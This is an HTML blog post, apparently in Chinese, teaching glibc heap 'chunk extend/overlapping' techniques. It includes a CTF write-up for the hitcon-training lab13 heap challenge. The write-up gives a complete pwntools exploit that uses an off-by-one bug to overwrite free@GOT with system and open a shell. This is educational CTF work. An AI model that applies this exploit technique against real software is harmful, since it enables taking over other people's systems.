@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Extend and Overlapping 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Extend and Overlapping</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-03-03 13:34:48
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/pwn-%E5%A0%86/" title="pwn_堆">
+                    #pwn_堆
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="chunk-extend-overlapping"><a href="#chunk-extend-overlapping" class="headerlink" title="chunk extend overlapping:"></a>chunk extend overlapping:</h1><p>通过extend实现chunk overlapping</p>
+<h2 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h2><h3 id="1、对inuse的fastbin进行extend"><a href="#1、对inuse的fastbin进行extend" class="headerlink" title="1、对inuse的fastbin进行extend:"></a>1、对inuse的fastbin进行extend:</h3><p>通过更改第一块的大小来控制第二块的内容</p>
+<pre class="language-python" data-language="python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#chunk1</span>
+malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#chunk2</span>
+
+<span class="token comment">#接下来篡改chunk1的size为(0x41)====》覆盖chunk2</span>
+
+free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#chunk1和chunk2合成了一个0x40大小的chunk，一起被释放了</span>
+malloc<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment">#得到chunk1+chunk2的块===》可以控制chunk2中的内容====》overlapping chunk</span>
+</code></pre>
+
+
+
+<h3 id="2、对inuse的smallbin进行extend"><a href="#2、对inuse的smallbin进行extend" class="headerlink" title="2、对inuse的smallbin进行extend"></a>2、对inuse的smallbin进行extend</h3><p>注意利用的不是fastbin&#x3D;&#x3D;》chunk在被释放后如果与top chunk相连&#x3D;&#x3D;&#x3D;》合并</p>
+<pre class="language-python" data-language="python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#chunk1</span>
+malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#chunk2</span>
+malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#防止与top chunk合并</span>
+
+<span class="token comment">#篡改chunk1的size为(0xb1)===》覆盖chunk2</span>
+
+free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#chunk1包含chunk2一起置入unsorted bin</span>
+<span class="token comment">#chunk3的inuse位变为0</span>
+
+malloc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#取回chunk1和chunk2的空间===》控制chunk2中的内容</span>
+<span class="token comment">#进入unsorted bin原因：</span>
+<span class="token comment">#释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</span></code></pre>
+
+
+
+<h3 id="3、对free的smallbin进行extend"><a href="#3、对free的smallbin进行extend" class="headerlink" title="3、对free的smallbin进行extend"></a>3、对free的smallbin进行extend</h3><pre class="language-python" data-language="python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#chunk1</span>
+malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#chunk2</span>
+
+free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#chunk2的标志位变0</span>
+
+<span class="token comment">#篡改chunk1的size===》(0xb1)</span>
+
+malloc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#可分配得到chunk1+chunk2的堆块===》控制chunk2</span></code></pre>
+
+
+
+<h3 id="4、通过extend向后overlapping"><a href="#4、通过extend向后overlapping" class="headerlink" title="4、通过extend向后overlapping"></a>4、通过extend向后overlapping</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc -g test4.c  -o test4</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">void</span> <span class="token operator">*</span>closure<span class="token punctuation">,</span> <span class="token operator">*</span>closure1<span class="token punctuation">;</span>
+    closure <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配第1个 0x10 的chunk1</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//分配第2个 0x10 的chunk2</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//分配第3个 0x10 的chunk3</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//分配第4个 0x10 的chunk4    </span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>closure <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>closure<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    closure1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>在malloc(0x50)对extend区域的重新占位后，其中0x10的块仍然可以正常分配和是放，此时构成overlapping，通过对overeapping进行操作</p>
+<h3 id="5、通过extend前向overlapping"><a href="#5、通过extend前向overlapping" class="headerlink" title="5、通过extend前向overlapping"></a>5、通过extend前向overlapping</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc -g test5.c -o test</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">void</span> <span class="token operator">*</span>closure1<span class="token punctuation">,</span> <span class="token operator">*</span>closure2<span class="token punctuation">,</span> <span class="token operator">*</span>closure3<span class="token punctuation">,</span> <span class="token operator">*</span>closure4<span class="token punctuation">;</span>
+    closure1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//smallbin1</span>
+    closure2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fastbin1</span>
+    closure3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fastbin2</span>
+    closure4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//smallbin2</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//防止与top合并</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>closure1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>closure4 <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x90</span><span class="token punctuation">;</span><span class="token comment">//修改pre_inuse域</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>closure4 <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span><span class="token comment">//修改pre_size域</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>closure4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//unlink进行前向extend</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x150</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//占位块</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>前向extend利用了smallbin的unlink机制，通过修改pre_size域可以跨越多个chunk进行合并overlapping</p>
+<p>extend&#x2F;shrink作用：</p>
+<p>控制chunk中的内容，如果chunk中存在指针，函数指针等，可以通过控制这些指针来进行信息泄露和控制执行流程</p>
+<p>也可以通过extend达到overlapping实现控制chunk的fd和bk指针&#x3D;&#x3D;&#x3D;》实现fastbin attack</p>
+<h2 id="例题：hitcontraning-lab13"><a href="#例题：hitcontraning-lab13" class="headerlink" title="例题：hitcontraning_lab13"></a>例题：hitcontraning_lab13</h2><h6 id="保护："><a href="#保护：" class="headerlink" title="保护："></a>保护：</h6><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220307170553980.png" style="zoom:50%;" />
+
+<p>开启了canary和NX保护</p>
+<h5 id="程序运行分析："><a href="#程序运行分析：" class="headerlink" title="程序运行分析："></a>程序运行分析：</h5><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220307171115763.png" style="zoom:50%;" />
+
+<p>程序为一个菜单栏，有创建堆块，修改堆块内容，打印堆块，删除堆块，退出功能</p>
+<h5 id="思路分析："><a href="#思路分析：" class="headerlink" title="思路分析："></a>思路分析：</h5><p>1、主界面函数：</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220307190355677.png" style="zoom:50%;" />
+
+<p>menu()函数是一个输出界面：</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220307190500194.png" style="zoom: 80%;" />
+
+<p>输入你的一个选择，通过switch进行判断输入的内容，执行相对应的函数</p>
+<h6 id="1、创建堆："><a href="#1、创建堆：" class="headerlink" title="1、创建堆："></a>1、创建堆：</h6><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220307204813672.png"></p>
+<p>由上可得：heaparray是一个数组，其中存放着指向第一个chunk的指针</p>
+<p>第一个chunk存放着第二个chunk的size和content的地址&#x3D;&#x3D;》结构体</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220307215352213.png" style="zoom: 67%;" />
+
+<p>红色区域为chunk1&#x3D;&#x3D;》结构体</p>
+<p>黄色区域为chunk2</p>
+<h6 id="2、修改堆内容"><a href="#2、修改堆内容" class="headerlink" title="2、修改堆内容"></a>2、修改堆内容</h6><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220307215652344.png"></p>
+<p><strong>在edit中也发现使用read_input函数，但是参数与create中不一样</strong></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220307215821798.png"></p>
+<p>edit中可以多读入1个字节&#x3D;&#x3D;》off-by-one</p>
+<p>&#x3D;&#x3D;》例如刚刚申请了32大小的堆块，此时就可以使用edit写入33字节的内容</p>
+<p>&#x3D;&#x3D;》溢出的1字节刚刚好就是下一个堆块的size部分</p>
+<h6 id="3、打印堆块"><a href="#3、打印堆块" class="headerlink" title="3、打印堆块"></a>3、打印堆块</h6><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220307221827372.png" style="zoom:67%;" />
+
+
+
+
+
+<h6 id="4、删除堆块"><a href="#4、删除堆块" class="headerlink" title="4、删除堆块"></a>4、删除堆块</h6><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220307221935750.png" style="zoom:67%;" />
+
+
+
+<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>程序中有off-by-one漏洞，可以实现覆盖到第二个结构体的inuse位造成extend</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220307222539602.png"></p>
+<p>如图已经将第二个结构体的inuse位覆盖成0x63</p>
+<p>&#x3D;&#x3D;》由于我申请的index2的大小为0x10&#x3D;&#x3D;》如果将index2的结构体扩展到0x40即可触发覆盖</p>
+<p>&#x3D;&#x3D;》由于现在是结构体覆盖content，无法对结构体修改&#x3D;&#x3D;》将index2释放&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220307223502822.png"></p>
+<p>此时我们再将他们申请回来&#x3D;&#x3D;》申请一个0x30大小的content&#x3D;&#x3D;》0x20的fastbin先被启用作为结构体</p>
+<p>0x40大小的fastbin作为content&#x3D;&#x3D;》content覆盖结构体&#x3D;&#x3D;》大空间可写覆盖小空间不可写</p>
+<pre class="language-none"><code class="language-none">payload&#x3D;&#39;a&#39;*24+&#39;\x41&#39;</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308093038270.png"></p>
+<p>overlapping导致结构体可以被篡改&#x3D;&#x3D;》篡改结构体的content指针为free_got&#x3D;&#x3D;》就可以利用show打印出free_addr,并且可以让free_got变成我们可修改的</p>
+<pre class="language-+p32()" data-language="+p32()"><code class="language-+p32()">payload&#x3D;p64(0)*3+p64(0x21)+p64(0x30)+p32(elf.got[&#39;free&#39;])</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308093227033.png"></p>
+<p>至此，我们已经可以控制free_got的内容，也可以使用show打印free函数的地址</p>
+<p>对于shell我们还需要system(‘&#x2F;bin&#x2F;sh’)&#x3D;&#x3D;》利用free函数的地址泄露出system函数的地址</p>
+<p>&#x3D;&#x3D;》将free_got覆盖成system&#x3D;&#x3D;》再调用free时即可调用system</p>
+<p>&#x3D;&#x3D;》接下来是将free函数的参数变成’&#x2F;bin&#x2F;sh’&#x3D;&#x3D;》在delete中调用了两个free函数&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308093903460.png"></p>
+<p>在第一个free中，参数为content的data起始地址，如果我们将’&#x2F;bin&#x2F;sh’作为data起始地址的内容，’&#x2F;bin&#x2F;sh’就将作为free函数的参数&#x3D;&#x3D;&#x3D;》也就变成system函数的参数&#x3D;&#x3D;》system(‘&#x2F;bin&#x2F;sh’)</p>
+<pre class="language-none"><code class="language-none">payload&#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;+&#39;a&#39;*0x10+&#39;\x41&#39;</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308094935626.png"></p>
+<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=UTF-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./heapcreator'</span> <span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./heapcreator'</span> <span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size of Heap : "</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content of heap:"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content of heap : "</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+add<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>
+
+payload<span class="token operator">=</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">'\x41'</span>
+edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content : "</span><span class="token punctuation">)</span>
+
+free_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment">#data=io.recvuntil("Done !")</span>
+<span class="token comment">#free_addr=u64(data.split('\n')[0].ljust(8,'\x00'))</span>
+<span class="token comment">#接收的data以'\n'为分隔符做切片，取第0个元素</span>
+
+libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
+libcbase<span class="token operator">=</span>free_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>
+
+sys_addr<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+
+edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token comment">#gdb.attach(io)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308100636497.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/03/01/Unlink/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-03-03 13:34:48
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/pwn-%E5%A0%86/" title="pwn_堆">
+                        #pwn_堆
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/03/04/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#chunk-extend-overlapping"><span class="toc-text">chunk extend overlapping:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-text">利用方式：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%AF%B9inuse%E7%9A%84fastbin%E8%BF%9B%E8%A1%8Cextend"><span class="toc-text">1、对inuse的fastbin进行extend:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%AF%B9inuse%E7%9A%84smallbin%E8%BF%9B%E8%A1%8Cextend"><span class="toc-text">2、对inuse的smallbin进行extend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%AF%B9free%E7%9A%84smallbin%E8%BF%9B%E8%A1%8Cextend"><span class="toc-text">3、对free的smallbin进行extend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E9%80%9A%E8%BF%87extend%E5%90%91%E5%90%8Eoverlapping"><span class="toc-text">4、通过extend向后overlapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E9%80%9A%E8%BF%87extend%E5%89%8D%E5%90%91overlapping"><span class="toc-text">5、通过extend前向overlapping</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Ahitcontraning-lab13"><span class="toc-text">例题：hitcontraning_lab13</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%EF%BC%9A"><span class="toc-text">保护：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">程序运行分析：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">思路分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%E3%80%81%E5%88%9B%E5%BB%BA%E5%A0%86%EF%BC%9A"><span class="toc-text">1、创建堆：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%E3%80%81%E4%BF%AE%E6%94%B9%E5%A0%86%E5%86%85%E5%AE%B9"><span class="toc-text">2、修改堆内容</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" 